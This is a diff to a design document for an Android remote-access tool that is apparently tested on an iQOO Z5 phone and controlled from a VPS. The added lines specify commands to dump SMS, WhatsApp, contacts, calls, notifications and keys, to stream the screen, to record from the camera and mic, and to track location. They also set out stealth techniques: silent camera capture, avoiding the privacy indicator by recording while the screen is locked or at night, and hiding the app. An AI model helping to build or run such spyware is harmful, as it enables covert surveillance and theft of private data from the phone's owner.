@@ -47,6 +47,25 @@ test target: iQOO Z5 (FunTouch OS 13 / Android 13).
 - stream screen to operator, type PIN via accessibility to unlock,
 - full remote control; restore brightness/lock on finish.
 
+### Command spec (v1 target verbs)
+list/status/devices; device info; files ls/tree/get/put/find/thumb/watch;
+sms recent/dump/send; wa dump; contacts; calls dump; notif stream/dump;
+keys dump; screen live/shot/record/start/stop; tap; type; key; unlock/lock;
+brightness get/set (0–255, stealth dimming); volume get/set/mute (streams:
+ring/media/alarm); cam snap/record (front/back); mic record; loc
+once/track/history/geofence; app list/open; shell; update; destroy;
+hide/unhide; watch --notif --files --loc (persistent event stream for agents).
+
+### Media-capture stealth notes
+- Camera shutter sound: we capture via the Camera2 API directly (never the
+  camera app) → no shutter sound on virtually all devices incl. iQOO.
+- Android 12+ shows a small green privacy dot in the status bar while
+  camera/mic are in use — cannot be removed without root. Mitigation: keep
+  captures short (dot only shows during use), prefer ambient-light/at-night
+  capture, capture while screen is off+locked (indicator only shows on
+  unlocked screen; dot appears in status bar when screen on).
+- Screen brightness 0 + dark theme during night ops; restore after.
+
 ### Server (on this VPS)
 - Core daemon: device registry (per-device ID), WebSocket listener,
   command router, per-device + broadcast commands, device status
